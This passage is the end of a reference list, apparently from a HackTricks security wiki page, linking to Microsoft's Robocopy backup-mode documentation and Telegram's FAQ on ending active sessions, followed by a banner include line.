- [12] [Microsoft Learn – backup mode Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – завершення активних сесій](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
